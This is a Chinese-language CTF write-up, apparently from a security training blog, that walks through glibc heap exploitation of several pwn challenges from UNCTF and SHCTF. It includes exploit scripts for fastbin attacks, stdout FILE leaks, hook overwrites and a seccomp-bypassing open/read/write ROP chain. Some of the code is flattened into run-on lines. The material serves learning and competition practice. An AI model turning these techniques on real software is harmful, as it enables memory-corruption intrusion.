原创： treebacker 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 0x01 闲说  

最近的两次CTF，pwn题目很有意思（虽然很菜没做出来几个），觉得有必要记录下。

## 0x02 UNCTF  

Box程序分析典型的heap题目，提供了类似add, edit,
delete的功能，但是没有show。从这里也可以看出难点在于泄露地址。chunk的size限制在fastbin里

![v2-3f0df81d25df55cbd1ea2f3c68fe92d7_hd.j](https://pic4.zhimg.com/80/v2-3f0df81d25df55cbd1ea2f3c68fe92d7_hd.jpg)

存在数组下溢，和UAF漏洞

![v2-70365efb2ad59e287bb8804a9296e093_hd.j](https://pic2.zhimg.com/80/v2-70365efb2ad59e287bb8804a9296e093_hd.jpg)

这里的溢出，导致可以修改chunk之外的地址

![v2-ba6f3efc3c81f3dc6a13ca451f584f3a_hd.j](https://pic3.zhimg.com/80/v2-ba6f3efc3c81f3dc6a13ca451f584f3a_hd.jpg)

UAF漏洞，这里组合一下可以Fastbin attack。

利用分析

由于并不存在输出，一般是需要IO的，这里我用数组下溢的漏洞覆写stdout结构。泄露出_IO_file_jumps，得到libc地址。

#leak address stdout edit(-12, p64(0xfbad1800) + p64(0)*3 + '\x00') data =
p.recv(0x20) leak = u64(data[0x18:]) #io_file
jump拿到libc后，就是怎么覆盖指针的问题了，这里用的是realloc，需要覆盖__realloc_hook。一开始我没想到UAF怎么利用，又重新打起了IO的主意，想要利用覆盖stdin达到任意地址写的目的。但是stdin在数组正向，下溢出达不到。
换了一个思路，发现realloc_hook在stdout下不远处，于是就想直接覆盖过去。结果，本地成功了，远程发现没能写进去，这是因为read的数目是不可控的，环境不同写入的长度不一样。
没办法，回到了UAF。才发现这个似乎简单些。只需要在realloc附低一些的位置找到合法的size，字节错位就可以修改fastbin的fd，实现分配。

#fastbin attack, uaf add(2, 0x58) add(3, 0x68) free(3) add(3, 0x68) edit(3,
p64(realloc_hook-0xb-0x10)) add(1, 0x68) add(2, 0x68) #realloc edit(2,
'a'*0xb+ p64(system)) add(0, 0x68)

小结

我这里应该是打了个非预期，看到大部分师傅是用的溢出。还有一个我不知道的知识点。就是realloc在size为0时，相当于free。然后利用unsorted
bin打stdout。之后再free 和 realloc的类free打出double free的效果。

orwheap程序分析

这题目里有沙箱，用sec查出限制的规则，限制了只能是x64的，且ban了execve。

![v2-23aa1b41784ecd7881c2ba8acc4eacc5_hd.j](https://pic1.zhimg.com/80/v2-23aa1b41784ecd7881c2ba8acc4eacc5_hd.jpg)

只提供了add，delete，edit的功能

漏洞在add的时候输入内容，存在off-by-null。

![v2-134bb36d100e132da8afad710bbadef7_hd.j](https://pic3.zhimg.com/80/v2-134bb36d100e132da8afad710bbadef7_hd.jpg)

利用分析之前见过sandbox这种，但是那时可以修改规则绕过，执行execve，但是这里似乎不存在。

查了一些博客和题目的提示"orwheap"，才知道是要想办法在栈上构造rop，open，read，write的方式。首先泄露libc吧，这里利用off-by-null构造经典的overlapping，覆盖stdout。

def exploit(): add(0x88, 'a'*0x10) #0 add(0x218, 'b'*0x10) #1 add(0x108,
'c'*0x10) #2 add(0x80, 'd'*0x10) #3 #fake edit(1, 'a'*0xf0 + p64(0x100) +
p64(0x101)) #into unsorted bin free(1) #null off by one free(0) add(0x88,
'a'*0x88) #0 #split from 1 add(0x88, 'b1') #1 add(0x68, 'b2') #4 add(0x88,
'b3') #5 free(1) free(2) #overlapping above b free(4) #into fastbin add(0x88,
'over') #1 #overwrite fastbin'fd to stdout 错位即可拿到IO_stdout add(0x290, '') #2
edit(2, '\xdd\x45') free(1) add(0x88, 'a'*0x80 + p64(0x91) + p64(0x71)) #1
modify size to 0x71 fastbin free(5) gdb.attach(p, 'p puts') dbg() add(0x68,
'padding') #4 add(0x68, 'stdout') #5 edit(5, 'a'*0x33 + p64(0xfbad1800) +
p64(0)*3 + '\x00') data = p.recv(0x90) leak = u64(data[0x88:]) #io_file jump
print "leak ==> " + hex(leak) if leak&0x7f00000008e0 == 0x7f00000008e0:
libc_base = leak - libc.symbols['_IO_2_1_stdin_'] print "libc_base ==> " +
hex(libc_base)

但是如何泄露stack和PIE的codebase呢？这里参考别的师傅的WP，用到了environ，通过stdout泄露environ下的内容可以泄露stack。。。

environ = libc.symbols['environ'] print "environ ==> " + hex(environ)
edit(5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+
p64(environ+0x8)) leakstack = u64(p.recv(6).ljust(8,'\x00')) print "leakstack
==> " + hex(leakstack) codeptr = leakstack - 0x30 print "codeptr ==> " +
hex(codeptr) edit(5,
'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+p64(codeptr)+p64(codeptr+0x8)+
p64(codeptr+0x8)) codebase = u64(p.recv(6).ljust(8, '\x00')) - 0x969 print
"codebase ==> " + hex(codebase)

![v2-7a19c14b47ce1d69291c5d98ba3afcf8_hd.j](https://pic3.zhimg.com/80/v2-7a19c14b47ce1d69291c5d98ba3afcf8_hd.jpg)

然后就是在stack上找到合法的size，得到chunk，进行rop的布置。完成open，read，write的流程。这个合法的size最后在edit功能的read函数ret时的stack中找到的。

dele(2)fakechunk = leakstack - 0x17bsuccess("fakechunk:
"+hex(fakechunk))edit(0,'0'*0x88+p64(0x71)+'1'*0x68+p64(0x71)+p64(fakechunk))add(0x68,'2')
add(0x68,'5')

之后就是rop的布置

prdiret = 0x0000000000001193+codebaseprsiret =
0x00000000000202e8+libcbaseprdxrsiret = 0x00000000001150c9+libcbase# : pop rdx
; pop rsi ; retleaveret = 0x0000000000000b40+codebaseprbp =
0x000000000001f930+libcbasebss = codebase + 0x202000openaddr = libcbase +
libc.symbols['open']read = libcbase + libc.symbols['read']writeaddr = libcbase
+ libc.symbols['write'] rop1 =
p64(prbp)+p64(bss+0x200)+p64(prsiret)+p64(bss+0x200)+p64(read)+p64(leaveret)
rop2 =
p64(0)+p64(prbp)+p64(bss+0x300)+p64(prdiret)+p64(0)+p64(prdxrsiret)+p64(0x200)+p64(bss+0x300)+p64(read)+p64(leaveret)
rop3 =
p64(0)+p64(prdiret)+p64(codebase+0x202388+8)+p64(prsiret)+p64(0)+p64(openaddr)+p64(prdiret)+p64(3)+p64(prdxrsiret)+p64(0x40)+p64(bss+0x500)+p64(read)+p64(prdiret)+p64(1)+p64(prdxrsiret)+p64(0x40)+p64(bss+0x500)+p64(writeaddr)+"/flag\x00"edit(5,'\x00'*(0x2b)+rop1)#p64(0xdeadbeef))sleep(1)sl(rop2)sleep(1)sl(rop3)irt()

小结- stack和heap的结合，绕过sandbox，很精彩。

## 0x03 SHCTF  

* * *

Boringheap

程序分析size只提供三种选择0x20, 0x30,
0x40，对字节错位的利用有一定的干扰。一开始真的没有找到问题在哪，后来注意到程序在求数组下标的时候多次用到abs函数求绝对值。在网上找到了一些有用的信息，这个函数有问题。（可以查阅abs的源码）

abs(0x80000000) = 0x80000000也就是说abs(‭-2147483648‬) = ‭-2147483648‬

只是这样还不够，这个溢出的太多，无法利用，但是有了取余操作就OK了。

问题在类似edit的功能里，这里的下标没有检查是否合法，经过取余，我们可以修改当前chunk的header字段，和上一个chunk的内容。

![v2-64f28022039d93e461c78384da38e05c_hd.j](https://pic2.zhimg.com/80/v2-64f28022039d93e461c78384da38e05c_hd.jpg)

利用分析提供了show功能，一般想办法利用unsorted bin泄露main_arena。

由于可以更改chunk的header，直接chunk overlapping进unsorted bin。

add(2, '\x00') #0 add(2, '\x11') #1 add(2, '\x22') #2 #fake a chunk as unlink
payload = p64(0) + p64(0x31) + p64(0)*3 + p64(0x21) add(2, payload) #3 #fake
big chunk add(3, p64(0) + p64(0x21)) #4 add(2, p64(0) + p64(0x21)) #5 add(3,
'\x66') #6 #fake chunk1's size to 0x91, contain chunk2 edit(1, 0x80000000,
p64(0)*3 + p64(0x91)) free(1) #chunk1 ,2 into unsorted bin, while 2 also in
chunk_ptr add(2, '\x11') #7 show(2) main_arena =
u64(p.recvline().strip('\n').ljust(8, '\x00')) - 0x58 print "main_arena ==> "
+ hex(main_arena) libc.address = main_arena - 0x3c4b20

有了libc后，同样需要修改malloc_hook。这里由于size的限制没办法直接利用0x7f字节错位，所以需要在libc附近写入0x51这类的数。首先，修改unsorted
bin的size，再分配与之前类似的chunk，就可以拿到多个同样地址的chunk指针。

add(2, '\x44') #8 edit(2, 0x80000000, p64(0)*3 + p64(0xd1)) #modify unsorted
bin's size , make a lat two pointer chunk free(2) add(2,"\xaa") #9
add(2,"\xaa") #10 add(3,"\x11") #11 add(1,"\x23") #12 add(1,"\x23") #13

![v2-85ad7c4514fe6cd5a444721dde8278a9_hd.j](https://pic4.zhimg.com/80/v2-85ad7c4514fe6cd5a444721dde8278a9_hd.jpg)

释放重复的pointer中的一个，可以操作另一个修改fastbin的fd。

free(12) free(4)

![v2-feac9b700260240a93b9aafe442d8bdf_hd.j](https://pic3.zhimg.com/80/v2-feac9b700260240a93b9aafe442d8bdf_hd.jpg)

字节错位的话，需要合法的size，与fastbin匹配，而我们发现chunk的地址都是0x5xxx...这类的，当然有一定的机率不是，但是总可以存在的。所以可以在main_arena内构造一个chunk。写入0x51这类合法的size。

![v2-965f34e9deda94833dd9b10d4155d51b_hd.j](https://pic1.zhimg.com/80/v2-965f34e9deda94833dd9b10d4155d51b_hd.jpg)

然后这里如何覆盖到malloc_hook呢？由于top
chunk在main_arena内，我们可以覆盖到malloc_hook附近。比较有意思的是，由于fastbin数组就存在main_arena里，我们可以直接构造xi相应的fastbin
chunk。这里构造的就在top chunk上方，并写入合法的size 0x51。

#modify fd' size to main_arena fake_fd = main_arena + 0x15 - 8 edit(11, 0,
p64(fake_fd)) add(3, '\x12') payload =
"\x11\x11\x11"+p64(libc.address+0x3c4***)+p64(0)*2+p64(0x51)+p64(0) add(3,
payload)

再次的分配就能覆盖top chunk到malloc_hook附近，继续分配就可以覆盖malloc_hook为one_gadget。

#modify top chunk which is in main_arena add(3,
p64(0)*2+p64(__malloc_hook-0x10)+p64(0x3c4b78+libc.address)+p64(0x3c4b78+libc.address)+p64(0x3c4b78+libc.address))
add(3,p64(libc.address+0xf1147))

小结

这题的妙处在修改main_arena的内容，即可以修改fastbin数组内容，又可以修改top
chunk。感觉这种方式很好使，之前没怎么尝试过，以后多试试！

程序分析

存在很明显的UAF漏洞

![v2-d8bb8e26d8abf3aad9017b5fbba2fd53_hd.j](https://pic2.zhimg.com/80/v2-d8bb8e26d8abf3aad9017b5fbba2fd53_hd.jpg)

结构里存在函数指针，且在一定条件下会调

![v2-f667049f8c975fe396ee19977d982bed_hd.j](https://pic1.zhimg.com/80/v2-f667049f8c975fe396ee19977d982bed_hd.jpg)

其实s还有栈溢出，但是又有canary保护，没办法利用。

利用分析一直想用那个函数指针调用，而且因为UAF的存在，函数指针可以覆写。但是由于strcmp的问题，没有合适的方法可以触发。比如，我想把参数改写为puts_got，但是需要输入puts的真实地址才能通过strcmp验证，这就扯了，我要是知道还泄露？

这里有一个想法，就是我们可以通过strcmp比较的结果给出的不同的输出能够爆破绕过ALSR。但是参考别的WP找到一个更好的绕过方式，那就是综合利用栈溢出和这个函数指针。之前在纯粹的栈溢出中，ROP的方式下ret指令，通常可以构成gadgets利用。但是，这条指令不是依赖于函数返回地址的，而是依赖于栈的。简单的说，就是任何时候执行ret指令，都可以把栈上的地址作为下一步的执行地址。这里也是用的这个。

首先看下，程序保存了一些符号信息，这些地址可以直接拿来绕过

![v2-acc3625d4f85844c507dddb80e986560_hd.j](https://pic4.zhimg.com/80/v2-acc3625d4f85844c507dddb80e986560_hd.jpg)

这里，不在执着于用函数指针去覆，而是用代码片段去覆盖，结合栈溢出的4个size，就可以劫持程序流程。

![v2-b7e93fc543e76ec80d92f4d28f54b666_hd.j](https://pic4.zhimg.com/80/v2-b7e93fc543e76ec80d92f4d28f54b666_hd.jpg)

这里为什么用4个pop是因为在栈溢出之后执行chunk里的指针函数时候的栈的布局

![v2-ee2a0d4e1d85d32afe274d3a886c0e2b_hd.j](https://pic4.zhimg.com/80/v2-ee2a0d4e1d85d32afe274d3a886c0e2b_hd.jpg)

这样就可以在不覆盖函数返回地址的情况下以ROPd的方式劫持程序流。

需要重复利用的时候，只需要将rop返回地址改到程序的正常结束的位置即可。

![v2-0c0fefc6a193fc4f8f57955d7ae89a81_hd.j](https://pic2.zhimg.com/80/v2-0c0fefc6a193fc4f8f57955d7ae89a81_hd.jpg)

add(0, 0x88, 'tree') add(1, 0x88, 'back') add(2, 0x88, 'aaaa') free(0) free(1)
puts_str = 0x400452 pop_4_ret = 0x400F2C pop_rdi = 0x0000000000400f33 puts_got
= 0x601FA8 puts_plt = 0x4006B8 ret = 0x400C13 payload = 'puts\x00\x00\x00\x00'
+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret) gdb.attach(p, 'b*
0x400E04') dbg() add(3, 0x18, p64(puts_str) + p64(pop_4_ret)) login(1,
len(payload), payload) p.recvline() puts_addr =
u64(p.recvline().strip('\n').ljust(8, '\x00')) libc.address = puts_addr -libc.symbols['puts'] system_addr = libc.symbols['system']

## 0x04 总结  

\- rop不仅在stack中，也可以和heap发生反应。- 灵活的利用IO会有别样的效果。

## 0x05 学习参考  

\- 萝卜- leedin

实验：CTF-PWN系列汇总

[课程:CTF-PWN系列汇总(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182014111015081500001)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创！

  

